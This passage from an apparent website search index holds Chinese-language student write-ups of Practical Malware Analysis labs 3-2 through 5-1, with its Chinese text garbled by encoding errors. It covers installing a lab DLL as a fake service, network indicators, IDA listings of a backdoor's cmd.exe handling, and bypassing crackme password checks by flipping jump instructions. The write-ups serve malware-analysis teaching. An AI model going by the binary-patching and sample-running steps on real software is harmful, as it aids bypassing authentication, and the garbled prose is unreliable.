æ­¤å®‰è£…è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“çš„æŒ‡ä»¤ä¸ºï¼š\n$ rundll32.exe Lab03-02.dll, installA QUESTION 2 #  regmon #  æ¢å¤è™šæ‹Ÿæœºå¿«ç…§åˆ°è¿è¡ŒåŠ¨æ€é“¾æ¥åº“ä¹‹å‰ï¼Œæ‰“å¼€ Regmonï¼Œè¿‡æ»¤ rundll32.exe è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå†é«˜äº®è°ƒç”¨çš„ CreateKey è¿™ä¸ªå‡½æ•°ï¼Œå†è¿è¡Œä¸Šé¢å®‰è£…åŠ¨æ€é“¾æ¥åº“çš„å‘½ä»¤ï¼Œæˆ‘ä»¬å¾—åˆ°ä»¥ä¸‹çš„ç»“æœï¼š\nå¯è§è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“é€šè¿‡ rundll32.exe åˆ›å»ºäº†ä¸€ä¸ªåä¸º IPRIP çš„æœåŠ¡ã€‚\nregedit #  æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ regedit è§‚å¯Ÿè¿™ä¸ªæ³¨å†Œè¡¨çš„å†…å®¹ï¼ˆå¯ä»¥çœ‹åˆ°å…¶åç§°ä¸º Intranet Network Awareness (INA+)ï¼‰ï¼š\nmsconfig #  å¦å¤–ä¹Ÿå¯ä»¥ç”¨ msconfig å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å®‰è£…çš„æœåŠ¡ï¼ˆå¯è§è¿™ä¸ªæœåŠ¡è¿˜å°è¯•å°†è‡ªå·±çš„åˆ¶ä½œå•†ä¼ªè£…ä¸ºå¾®è½¯å®˜æ–¹ï¼‰ï¼š\nå¯åŠ¨ #  å¯ä»¥ç”¨ä»¥ä¸‹çš„å‘½ä»¤å¯åŠ¨è¿™ä¸ªæœåŠ¡ï¼š\n$ net start IPRIP Intranet Network Awareness (INA+) æœåŠ¡æ­£åœ¨å¯åŠ¨ . Intranet Network Awareness (INA+) æœåŠ¡å·²ç»å¯åŠ¨æˆåŠŸã€‚ QUESTION 3 #   How can you find the process under which this malware is running?\n è¿è¡Œèµ·æœåŠ¡ä¹‹åï¼Œå¯ä»¥ç”¨ tasklist å‘½ä»¤æŸ¥çœ‹è¿è¡ŒæœŸç¨‹åºçš„ PIDï¼š\nå¯è§è¿™æ˜¯ svchost.exe è¿™ä¸ªç¨‹åºå†è¿è¡Œè¿™ä¸ªæœåŠ¡ï¼Œå…¶ PID æ˜¯ 1060ã€‚å¦å¤–ï¼Œå¯ä»¥ç”¨ procexp è¿™ä¸ªè½¯ä»¶æœç´¢è°ƒç”¨ Lab03-02.dll çš„åº”ç”¨ç¨‹åºï¼š\nä¹Ÿå¯ä»¥è§åˆ°è°ƒç”¨è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“çš„æ˜¯ PID ä¸º 1060 çš„ç¨‹åº svchost.exeã€‚\nQUESTION 4 #   Which filters could you set in order to use procmon to glean information?\n é€šè¿‡ PID is 1060 è¿‡æ»¤ PIDï¼š\nå› ä¸ºè¿™è¿‡æ»¤çš„æ˜¯ svchost.exe è¿™ä¸ªè¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯ç”¨äºç®¡ç†æœåŠ¡çš„ï¼›åŒæ—¶æ ¹æ®ç¬¬ä¸‰é—®çš„æŸ¥çœ‹ï¼Œç”¨è¿™ç§æ–¹æ³•è¿‡æ»¤ä¼šé€‰å‡ºå…¶ä»–çš„æœåŠ¡ã€‚\nQUESTION 5 #   What are the malwareâ€™s host-based indicators?\n æ ¹æ®å‰é¢çš„è§‚å¯Ÿï¼Œä¸»è¦ä¼šæœ‰ä»¥ä¸‹çš„ç‰¹å¾ï¼š\n å®‰è£…äº†ä¸€ä¸ªæœåŠ¡ Intranet Network Awareness (INA+)ï¼Œå…¶åˆ¶é€ å•†è¢«ä¼ªé€ ä¸º Microsoft Corporationï¼› ä¸Šé¢çš„æœåŠ¡è¢«å®‰è£…åœ¨äº†æ³¨å†Œè¡¨ä¸­åä¸º IPRIP è¡¨é¡¹æœåŠ¡ï¼Œè¿™ä¸ªè¡¨é¡¹ä¸­è¿˜æœ‰åŠ¨æ€é“¾æ¥åº“çš„ä½ç½®ï¼› åœ¨è¿è¡Œæ—¶æŸ¥çœ‹è°ƒç”¨çš„åŠ¨æ€é“¾æ¥åº“æ˜¯å¦æœ‰ Lab03-02.dll  QUESTION 6 #   Are there any useful network-based signatures for this malware?\n å¯¹äºç½‘ç»œè¿æ¥ï¼Œæˆ‘ä»¬åƒ 3-1 ä¸€æ ·æ­å»ºä¸€ä¸ªç½‘ç»œåˆ†æç¯å¢ƒï¼Œå…ˆæ‰“å¼€ Win7 è¿è¡Œä¸€ä¸ª DNS æœåŠ¡ï¼Œå¹¶å°† DNS è§£æç»“æœå…¨éƒ¨æŒ‡å‘ Kali Linuxï¼Œå¹¶åœ¨ Kali Linux ä¸Šè¿è¡Œä¸€ä¸ª INetSim æœåŠ¡ã€‚\né¦–å…ˆï¼Œæˆ‘ä»¬åœ¨ Win7 çš„ DNS æœåŠ¡å™¨ä¸­çœ‹åˆ°ç—…æ¯’å¯åŠ¨åè¯·æ±‚è§£æ practicalmalwareanalysis.com è¿™ä¸ªåŸŸåï¼š\næˆ‘ä»¬å°†è¿™ä¸ªåŸŸåè§£æåˆ° Kali Linux ä¸Šåï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼æŸ¥çœ‹æ¥è‡ª XP çš„è®¿é—® practicalmalwareanalysis.com çš„è®¿é—®è®°å½•ï¼š\n$ cat /usr/share/inetsim/log/service.log | grep 128 | grep malware [2019-05-11 07:25:58] [3067] [http_80_tcp 3860] [192.168.32.128:1038] recv: Host: practicalmalwareanalysis.com [2019-05-11 07:25:58] [3067] [http_80_tcp 3860] [192.168.32.128:1038] info: Request URL: http://practicalmalwareanalysis.com/serve.html [2019-05-11 07:25:58] [3067] [http_80_tcp 3860] [192.168.32.128:1038] stat: 1 method=GET url=http://practicalmalwareanalysis.com/serve.html sent=/usr/share/inetsim/data/http/fakefiles/sample.html postdata= å¯è§è¿™ä¸ªæœåŠ¡é€šè¿‡ 80 ç«¯å£è®¿é—®äº† http://practicalmalwareanalysis.com/serve.html è¿™ä¸ªåœ°å€ã€‚\n"},{"id":271,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-3/","title":"Lab3 3","section":"03","content":"lab 3-3 #  QUESTION 1 #   What do you notice when monitoring this malware with Process Explorer?\n æ‹¿åˆ°ç—…æ¯’é¦–å…ˆåˆ†ææ˜¯å¦åŠ å£³ï¼š\nå¯è§å…¶ packer å°±æ˜¯ Visual C++ 6.0ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•åŠ å£³ï¼Œç†è®ºä¸Šå¯ä»¥ç›´æ¥åˆ†æåæ±‡ç¼–ä»£ç ï¼Œä½†æ˜¯é¢˜ç›®è®©æˆ‘ä»¬è¿›è¡ŒåŠ¨æ€åˆ†æï¼Œäºæ˜¯æˆ‘ä»¬å†è™šæ‹Ÿæœºä¸­è¿è¡Œè¿™ä¸ªç—…æ¯’ã€‚\næˆ‘ä»¬é¦–å…ˆæ‰“å¼€ Procexp ä¸ Procmonï¼Œç„¶åè¿è¡Œ Lab03-03.exe è¿™ä¸ªç¨‹åºï¼š\næˆ‘ä»¬å‘ç° Lab03-03.exe è¿™ä¸ªåº”ç¨‹åºå†è¿è¡Œæ—¶åˆ›å»ºäº†ä¸€ä¸ª svchost.exe çš„å­è¿›ç¨‹ã€‚\nå¦å¤–æˆ‘ä»¬å°è¯•é€šè¿‡ procmon ä¸­è¿‡æ»¤ Process Name =is= Lab03-03.exe è¿›ç¨‹è§‚å¯Ÿè¿™ä¸ªè¿›ç¨‹è°ƒç”¨çš„ APIã€‚æˆ‘ä»¬å‘ç°è¿™ä¸ªç—…æ¯’å°è¯•åˆ›å»ºè¿™æ ·ä¸€ä¸ªæ•æ„Ÿæ–‡ä»¶ C:/Windows/System32/svchost.exeï¼š\næˆ‘ä»¬çŒœæµ‹è¿™ä¸ªç—…æ¯’å¯èƒ½å°è¯•æ›¿æ¢ç”µè„‘ä¸­çš„ svchost.exe æ–‡ä»¶ï¼Œå¹¶ä¸”æ›¿æ¢ç”µè„‘çš„æœåŠ¡è¿›ç¨‹ã€‚\nQUESTION 2 #   Can you identify any live memory modifications?\n åŒæ ·çš„æˆ‘ä»¬å† procmon ä¸­æ·»åŠ ä»¥ä¸‹çš„ä¸¤æ¡è¿‡æ»¤æ¡ä»¶ï¼š\n\u0026#34;Process Name\u0026#34; is \u0026#34;Lab03-03.exe\u0026#34; \u0026#34;Operations\u0026#34; contains \u0026#34;Create\u0026#34; é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œè¿™ä¸ªæ¶æ„ä»£ç ä¸»è¦å°è¯•åˆ›å»ºä»¥ä¸‹çš„å‡ ä¸ªæ–‡ä»¶ï¼šsvchost.exeã€apphelp.dllã€systest.db ç­‰ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ–‡ä»¶ç”±äºæƒé™é—®é¢˜åˆ›å»ºå¤±è´¥ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿæœ‰ç†ç”±ç›¸ä¿¡å®ƒå› ä¸ºæƒé™é—®é¢˜æ— æ³•å†™å…¥æ–‡ä»¶ã€‚\næ‰€ä»¥å¤§è‡´çŒœæµ‹ï¼Œè¯¥æ¶æ„ä»£ç å°è¯•æ›¿æ¢ä¸»æœºä¸Šçš„ svchost.exe æ–‡ä»¶ï¼Œä½†å› ä¸ºæƒé™é—®é¢˜æ— æ³•å†™å…¥ã€‚ä½†æ˜¯é€šè¿‡ç¬¬ä¸€é—®çš„åˆ†æï¼Œæ¶æ„ä»£ç å¯èƒ½å·²ç»æ›¿æ¢äº†æ­£è¿è¡Œåœ¨å†…å­˜ä¸­çš„ svchost.exe æ–‡ä»¶ã€‚\nå¦å¤–è¿›ä¸€æ­¥è§‚å¯Ÿè¿™é‡Œè°ƒç”¨çš„ APIï¼Œå‘ç°è¿™ä¸ªç—…æ¯’è¿˜åœ¨åŒçº§ç›®å½•ä¸‹åˆ›å»ºäº†æ–‡ä»¶ practicalmalwareanalysis.logï¼Œè¿™ä¸ªæ–‡ä»¶ã€‚\nQUESTION 3 #   What are the malwareâ€™s host-based indicators?\n å¦‚åŒå‰é¢ä¸¤èŠ‚æ­å»ºç½‘ç»œæµ‹è¯•ç¯å¢ƒï¼šWindows XP è¿è¡Œç—…æ¯’ã€Windows 7 æ­å»º DNS æœåŠ¡ã€Kali Linux æ­å»º WEBã€SSH ç­‰åº”ç”¨å±‚æœåŠ¡ã€‚\nè¿è¡Œç—…æ¯’åï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å† Windows 7 ä¸Šçœ‹åˆ°æ¥è‡ª Windows XP çš„ä»»ä½• DNS è¯·æ±‚ï¼Œå†åœ¨ Kali Linux ä¸Šå†ä½¿ç”¨ wireshark æ•è·æ•´ä¸ªç½‘å¡ä¸Šçš„æ‰€æœ‰æµé‡ä¿¡æ¯ï¼Œå¹¶æ²¡æœ‰ä»»ä½•ç›¸å…³ä¿¡æ¯ã€‚\nå› æ­¤ç»¼ä¸Šæ‰€è¿°ï¼Œå¯ä»¥å”¯ä¸€è§‚å¯Ÿåˆ°çš„ä¸»æœºè¿¹è±¡æ˜¯åˆ›å»ºäº†åŒç›®å½•ä¸‹çš„æ–‡ä»¶ practicalmalwareanalysis.logã€‚\nQUESTION 4 #   What is the purpose of this program?\n ç»è¿‡å‰é¢çš„åˆ†æï¼Œè¿™ä¸ªç¨‹åºä¸»è¦æ›¿æ¢äº†ä¸€ä¸ª svchost.exe æ–‡ä»¶ã€‚ä½†æ˜¯å¹¶æ²¡æœ‰å‘èµ·ä»»ä½•ç½‘ç»œè¯·æ±‚ï¼Œå¦å¤–è¿˜åœ¨åŒçº§ç›®å½•ä¸‹çš„æ–‡ä»¶ practicalmalwareanalysis.log ä¸­è®°å½•äº†ä¸€äº›ä¸œè¥¿ï¼š\n[Window: C:\\Documents and Settings\\Administrator\\æ¡Œé¢\\Practical Malware Analysis Labs\\BinaryCollection\\Cha]\r[Window: practicalmalwareanalysis.log å±æ€§]\rc\r[Window: C:\\Documents and Settings\\Administrator\\æ¡Œé¢\\Practical Malware Analysis Labs\\BinaryCollection\\Cha]\r[Window: C:\\Documents and Settings\\Administrator\\æ¡Œé¢\\Practical Malware Analysis Labs\\BinaryCollection\\Chapter_3L\\practicalmalwareanalysis.log - EverEdit]\rac æš‚æ—¶è¿˜ä¸çŸ¥é“è¿™ä¸ªè®°å½•çš„å†…å®¹æ˜¯ä»€ä¹ˆã€‚\n"},{"id":272,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/03/lab3-4/","title":"Lab3 4","section":"03","content":"lab 3-4 #  QUESTION 1 #   What happens when you run this file?\n æ‹¿åˆ°ç—…æ¯’é¦–å…ˆåˆ†ææ˜¯å¦åŠ å£³ï¼š\nåŒæ ·çš„è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ Microsoft Visual C++ 6.0ï¼ŒåŒæ ·ç†è®ºä¸Šä¹Ÿå¯ä»¥ç›´æ¥åˆ†æåæ±‡ç¼–ä»£ç ã€‚å¯¹äºæœ¬é¢˜æˆ‘ä»¬åªéœ€è¦åŒå‡»è¿è¡Œå³å¯ã€‚\nåŒå‡»è¿è¡Œç»“æœï¼šç—…æ¯’é—ªé€€ï¼Œç„¶åæŠŠè‡ªå·±åˆ æ‰äº†ã€‚\nQUESTION 2 #   What is causing the roadblock in dynamic analysis?\n è¿™ä¸ªç—…æ¯’ä¼šæ£€æµ‹è‡ªå·±æ˜¯å¦è¢«æ­£ç¡®æ‰§è¡Œï¼Œç„¶åé—ªé€€æŠŠè‡ªå·±åˆ é™¤ã€‚\nQUESTION 3 #   Are there other ways to run this program?\n åˆ†æåæ±‡ç¼–ä»£ç åº”è¯¥å¯ä»¥è§‚å¯Ÿè¿™ä¸ªç¨‹åºéœ€è¦ä»€ä¹ˆæ‰‹æ®µæ‰å¯ä»¥æ­£ç¡®æ‰§è¡Œï¼Œä½†æ˜¯æˆ‘æ‡’ï¼Œä¸æƒ³ç»§ç»­åˆ†æäº†ã€‚\n"},{"id":273,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-1/","title":"Lab4 1","section":"04","content":"lab 4-1 #  ç”¨ IDA pro æ‰“å¼€æ–‡ä»¶ï¼š\nint __cdecl main_0(int argc, const char **argv) {  int result; // eax   if ( argc == 2 )  {  if ( !j_strcmp(argv[1], \u0026#34;topsecret\u0026#34;) )  printf(\u0026#34;You found the password! Congratulations!\\n\u0026#34;);  else  printf(\u0026#34;Fail!\\n\u0026#34;);  result = 0;  }  else  {  printf(\u0026#34;Usage: crackme-123-1 password\\n\u0026#34;);  result = 1;  }  return result; } .text:004113C2 push offset Str2 ; \u0026#34;topsecret\u0026#34; .text:004113C7 mov eax, [ebp+arg_4] .text:004113CA mov ecx, [eax+4] .text:004113CD push ecx ; Str1 .text:004113CE call j_strcmp .text:004113D3 add esp, 8 .text:004113D6 test eax, eax .text:004113D8 jnz short loc_4113F5 .text:004113DA mov esi, esp .text:004113DC push offset aYouFoundThePas ; \u0026#34;You found the password! Congratulation\u0026#34;... .text:004113E1 call ds:printf .text:004113E7 add esp, 4 .text:004113EA cmp esi, esp .text:004113EC call j___RTC_CheckEsp .text:004113F1 xor eax, eax .text:004113F3 jmp short loc_41140E é€šè¿‡æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°åªè¦å°†ç¬¬8è¡Œçš„ jnz short loc_4113F5 æ”¹ä¸º jz short loc_4113F5 å³æŠŠåˆ¤æ–­æ¡ä»¶åè½¬å³å¯åšåˆ°è¾“å…¥éšæœºå­—ç¬¦ä¸²å¯é€šè¿‡è®¤è¯ã€‚\n"},{"id":274,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-2/","title":"Lab4 2","section":"04","content":"Lab 4-2 #  ç”¨ IDA pro æ‰“å¼€æ–‡ä»¶ï¼Œåˆ†æä¼ªä»£ç ï¼š\nint __cdecl main_0(int argc, const char **argv) {  int result; // eax   if ( argc == 2 )  {  if ( !j_strcmp(argv[1], \u0026#34;alligator\u0026#34;) )  printf(\u0026#34;You found the password! Congratulations!\\n\u0026#34;);  else  printf(\u0026#34;Fail!\\n\u0026#34;);  result = 0;  }  else  {  printf(\u0026#34;Usage: crackme-123-2 password\\n\u0026#34;);  result = 1;  }  return result; } å‘ç°ä¸å‰ä¸€ä¸ªä¸€æ ·ï¼Œæ‰€ä»¥åŒæ ·ä¿®æ”¹å¯¹åº”çš„æ±‡ç¼–å³å¯ã€‚\n"},{"id":275,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-3/","title":"Lab4 3","section":"04","content":"Lab 4-3 #  è¿˜æ˜¯ç”¨ IDA pro åˆ†æï¼Œå¾—åˆ°ä¼ªä»£ç ï¼š\nsigned int __cdecl main_0(int a1, int a2) {  signed int result; // eax   if ( a1 == 3 )  {  if ( !j_strcmp(*(const char **)(a2 + 4), \u0026#34;suffering\u0026#34;) )  {  if ( !j_strcmp(*(const char **)(a2 + 8), \u0026#34;succotash\u0026#34;) )  printf(\u0026#34;Congratulations! You found the passwords!\\n\u0026#34;);  else  printf(\u0026#34;Fail! Second word was wrong!\\n\u0026#34;);  result = 0;  }  else  {  printf(\u0026#34;Fail! First word was wrong!\\n\u0026#34;);  result = 0;  }  }  else  {  printf(\u0026#34;Usage: crackme-123-3 password1 password2\\n\u0026#34;);  result = 1;  }  return result; } è¿™ä¸ªæ˜¯è¦è¾“å…¥ä¸¤ä¸ªå¯†ç çš„ï¼Œå°±æ”¹ä¸¤ä¸ªæ¡ä»¶åˆ¤æ–­å°±å¯ä»¥äº†ã€‚\n.text:004113D2 push offset Str2 ; \u0026#34;suffering\u0026#34; .text:004113D7 mov eax, [ebp+arg_4] .text:004113DA mov ecx, [eax+4] .text:004113DD push ecx ; Str1 .text:004113DE call j_strcmp .text:004113E3 add esp, 8 .text:004113E6 test eax, eax .text:004113E8 jz short loc_411405 .text:004113EA mov esi, esp .text:004113EC push offset aFailFirstWordW ; \u0026#34;Fail! First word was wrong!\\n\u0026#34; .text:004113F1 call ds:printf .text:004113F7 add esp, 4 .text:004113FA cmp esi, esp .text:004113FC call j___RTC_CheckEsp .text:00411401 xor eax, eax .text:00411403 jmp short loc_411451  .text:00411405 loc_411405: ; CODE XREF: _main_0+58â†‘j .text:00411405 push offset aSuccotash ; \u0026#34;succotash\u0026#34; .text:0041140A mov eax, [ebp+arg_4] .text:0041140D mov ecx, [eax+8] .text:00411410 push ecx ; Str1 .text:00411411 call j_strcmp .text:00411416 add esp, 8 .text:00411419 test eax, eax .text:0041141B jz short loc_411438 å°†ç¬¬ 8 è¡Œå’Œç¬¬ 26 è¡Œçš„ jz å‘½ä»¤æ”¹ä¸º jnz å³å¯ã€‚\n"},{"id":276,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/04/lab4-4/","title":"Lab4 4","section":"04","content":"Lab 4-4 #  åˆæ˜¯ç”¨ IDA pro åˆ†ææ–‡ä»¶ï¼Œå¾—åˆ°ï¼š\nsigned int __cdecl main_0(int a1, const char **a2) {  signed int result; // eax   if ( a1 == 2 )  {  if ( !j_strcmp(*a2, \u0026#34;game3.exe\u0026#34;) )  {  if ( !j_strcmp(a2[1], \u0026#34;dromedary\u0026#34;) )  printf(\u0026#34;Congratulations! You solved the crackme puzzle!\\n\u0026#34;);  else  printf(\u0026#34;Incorrect password!\\n\u0026#34;);  result = 0;  }  else  {  printf(\u0026#34;Fail!\\n\u0026#34;);  result = 0;  }  }  else  {  printf(\u0026#34;Usage: game3.exe password\\n\u0026#34;);  result = 1;  }  return result; } è¿™é‡Œå¯ä»¥çœ‹å‡ºé¦–å…ˆéœ€è¦å°†æ–‡ä»¶åæ”¹ä¸º game3.exe ç„¶åå†è¿›è¡Œè¾“å…¥ game3.exe dromedary\nå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æ›´æ”¹å¯¹åº”æ±‡ç¼–ä»£ç çš„å½¢å¼å®ç°éšæœºè¾“å…¥çš„è®¤è¯ã€‚\nè¿™é‡Œè¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼šæ”¹å®Œæ–‡ä»¶åä¹‹åï¼Œè¿è¡Œæ–‡ä»¶çš„å‘½ä»¤è¡Œç•Œé¢ç”¨ cmd ç•Œé¢ï¼Œä¸è¦ä½¿ç”¨ ./ å‘½ä»¤ï¼Œå› ä¸ºä½¿ç”¨ ./ å‘½ä»¤åä¼ å…¥çš„å­—ç¬¦ä¸²ä¸ºæ–‡ä»¶çš„ç»å¯¹åœ°å€ï¼Œä¼šå¯¼è‡´ strcmp å‡½æ•°çš„è¿”å›é0\n"},{"id":277,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/05/lab5-1/","title":"Lab5 1","section":"05","content":"lab 5-1 #  QUESTION 1 #   What is the address of DllMain?\n æˆ‘ä»¬ç”¨ Ida Pro åŠ è½½è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨å·¦ä¾§çš„å‡½æ•°çª—å£ç‚¹å‡» Ctrl+Fï¼Œè¾“å…¥å‡½æ•°å DLLMainï¼Œå³å¯æœç´¢ï¼š\nå¯è§å…¶å…¥å£åœ°å€æ˜¯ .text:1000D02Eã€‚\nQUESTION 2 #   Use the Imports window to browse to gethostbyname. Where is the import located?\n åŒæ ·çš„æ–¹æ³•åœ¨ Import windows ä¸­ç‚¹å‡» Ctrl + Fï¼ŒåŒå‡»è¿›å…¥åï¼š\n.idata:100163CC ; struct hostent *__stdcall gethostbyname(const char *name)\r.idata:100163CC extrn gethostbyname:dword å¯è§å…¶åœ°å€æ˜¯ .idata:100163CC\nQUESTION 3 #   How many functions call gethostbyname?\n å¯ä»¥åœ¨ Ida Pro ä¸­ä½¿ç”¨ xrefs å·¥å…·æŸ¥çœ‹è°ƒç”¨çš„å‡½æ•°ï¼Œåœ¨ä¸Šä¸€é¢˜çš„å‡½æ•°å®šä¹‰ä½ç½®å³é”®å¯ä»¥é€‰æ‹© list cross refrence to ...ï¼š\nå¯è§è¿™ä¸ªå‡½æ•°è°ƒç”¨äº† 18 æ¬¡ã€‚æŒ‰åç§°æ’åºä¹‹åå¯ä»¥å¾—åˆ°ä¸€å…±æœ‰ 9 ä¸ªä¸åŒçš„å‡½æ•°\nQUESTION 4 #   Focusing on the call to gethostbyname located at 0x10001757, can you figure out which DNS request will be made?\n åœ¨ 0x10001757 å¤„çš„è°ƒç”¨å³ä¸Šå›¾å‡½æ•° sub_10001656 åœ¨ 101 è¡Œçš„è°ƒç”¨ï¼š\n.text:1000174E mov eax, off_10019040\r.text:10001753 add eax, 0Dh\r.text:10001756 push eax ; name\r.text:10001757 call ds:gethostbyname æ ¹æ®ä¹‹å‰å‡½æ•°çš„å®šä¹‰çš„è§‚å¯Ÿæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œgethostname çš„å‚æ•°æ˜¯ä¸€ä¸ª const char *ï¼Œäºæ˜¯æˆ‘ä»¬çŸ¥é“è¿™ä¸ª DNS å‡½æ•°è§£æçš„æ˜¯ off_10019040 è¿™ä¸ªä½ç½®çš„å­—ç¬¦ä¸²ï¼š\n.data:10019040 off_10019040 dd offset aThisIsRdoPics_\r.data:10019040 ; DATA XREF: sub_10001656:loc_10001722\u0018r\r.data:10019040 ; sub_10001656+F8\u0018r ...\r.data:10019040 ; \u0026#34;[This is RDO]pics.praticalmalwareanalys\u0026#34;... è¯¥å¤„å­˜å‚¨çš„ä¹Ÿæ˜¯ä¸€ä¸ªåœ°å€ï¼Œå®ƒæŒ‡å‘ 10019040 è¿™ä¸ªä½ç½®ï¼š\n.data:10019194 aThisIsRdoPics_ db \u0026#39;[This is RDO]pics.praticalmalwareanalysis.com\u0026#39;,0\r.data:10019194 ; DATA XREF: .data:off_10019040\u0018o å¯è§å®ƒè¦è§£æçš„æ˜¯ pics.praticalmalwareanalys.com\nQUESTION 5 #   How many local variables has IDA Pro recognized for the subroutine at 0x10001656?\n åœ¨ Ida Pro ä¸­æŒ‰ gï¼Œè¾“å…¥åœ°å€ 0x10001656 å³å¯çœ‹åˆ°ä½äºè¿™ä¸ªåœ°å€çš„å­è¿‡ç¨‹ï¼š\n.text:10001656\r.text:10001656 ; =============== S U B R O U T I N E =======================================\r.text:10001656\r.text:10001656\r.text:10001656 ; DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)\r.text:10001656 sub_10001656 proc near ; DATA XREF: DllMain(x,x,x)+C8\u0019o\r.text:10001656\r.text:10001656 var_675 = byte ptr -675h\r.text:10001656 var_674 = dword ptr -674h\r.text:10001656 hModule = dword ptr -670h\r.text:10001656 timeout = timeval ptr -66Ch\r.text:10001656 name = sockaddr ptr -664h\r.text:10001656 var_654 = word ptr -654h\r.text:10001656 Dst = dword ptr -650h\r.text:10001656 Str1 = byte ptr -644h\r.text:10001656 var_640 = byte ptr -640h\r.text:10001656 CommandLine = byte ptr -63Fh\r.text:10001656 Str = byte ptr -63Dh\r.text:10001656 var_638 = byte ptr -638h\r.text:10001656 var_637 = byte ptr -637h\r.text:10001656 var_544 = byte ptr -544h\r.text:10001656 var_50C = dword ptr -50Ch\r.text:10001656 var_500 = byte ptr -500h\r.text:10001656 Buf2 = byte ptr -4FCh\r.text:10001656 readfds = fd_set ptr -4BCh\r.text:10001656 buf = byte ptr -3B8h\r.text:10001656 var_3B0 = dword ptr -3B0h\r.text:10001656 var_1A4 = dword ptr -1A4h\r.text:10001656 var_194 = dword ptr -194h\r.text:10001656 WSAData = WSAData ptr -190h\r.text:10001656 lpThreadParameter= dword ptr 4\r.text:10001656\r.text:10001656 sub esp, 678h åœ°å€å°äºæ ˆå¸§åœ°å€çš„æ˜¯å±€éƒ¨å˜é‡ï¼Œåœ°å€å¤§äºæ ˆå¸§çš„æ˜¯å‚æ•°ï¼Œå› æ­¤ä¸€å…±æœ‰ 23 ä¸ªå±€éƒ¨å˜é‡ã€‚\nQUESTION 6 #   How many parameters has IDA Pro recognized for the subroutine at 0x10001656?\n è·Ÿç¬¬äº”é¢˜åŒæ ·åˆ†æï¼Œæœ‰ 1 ä¸ªã€‚\nQUESTION 7 #   Use the Strings window to locate the string \\cmd.exe /c in the disassembly. Where is it located?\n åœ¨ Ida Pro ä¸­ shift + F12 æ‰“å¼€å­—ç¬¦ä¸²çª—å£ï¼ŒæŒ‰ Ctrl + F æœç´¢ \\cmd.exe /c è¿™ä¸ªå­—ç¬¦ä¸²ï¼š\nxdoors_d:10095B34 0000000D C \\\\cmd.exe /c æ‰€ä»¥è¿™ä¸ªå­—ç¬¦ä¸²ä½äº xdoors_d:10095B34 è¿™ä¸ªåœ°å€ä¸Šã€‚\nQUESTION 8 #   What is happening in the area of code that references \\cmd.exe /c?\n æˆ‘ä»¬é¦–å…ˆå¯»æ‰¾è°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²çš„ä½ç½®ï¼š\nUp o sub_1000FF58+278 push offset aCmd_exeC; \u0026#34;\\\\cmd.exe /c \u0026#34; å¯è§è°ƒç”¨çš„å‡½æ•°æ˜¯ sub_1000FF58+278ï¼š\n.text:100101C8 cmp dword_1008E5C4, ebx\r.text:100101CE jz short loc_100101D7\r.text:100101D0 push offset aCmd_exeC ; \u0026#34;\\\\cmd.exe /c \u0026#34;\r.text:100101D5 jmp short loc_100101DC\r.text:100101D7 ; ---------------------------------------------------------------------------\r.text:100101D7\r.text:100101D7 loc_100101D7: ; CODE XREF: sub_1000FF58+276\u0018j\r.text:100101D7 push offset aCommand_exeC ; \u0026#34;\\\\command.exe /c \u0026#34;\r.text:100101DC\r.text:100101DC loc_100101DC: ; CODE XREF: sub_1000FF58+27D\u0018j\r.text:100101DC lea eax, [ebp+CommandLine] å°±è¿™å‡ è¡Œçš„ä»£ç çœ‹ï¼Œåº”è¯¥æ˜¯è¿›è¡Œäº†ä¸€æ¬¡ if åˆ¤æ–­ä¹‹åå¤åˆ¶äº†ä¸€æ¬¡å­—ç¬¦ä¸²çš„æ“ä½œã€‚\nQUESTION 9 #   In the same area, at 0x100101C8, it looks like dword_1008E5C4 is a global variable that helps decide which path to take. How does the malware set dword_1008E5C4? (Hint: Use dword_1008E5C4â€™s cross-references.)\n æˆ‘ä»¬æ ¹æ®ä»¥ä¸‹çš„æ“ä½œï¼š\n 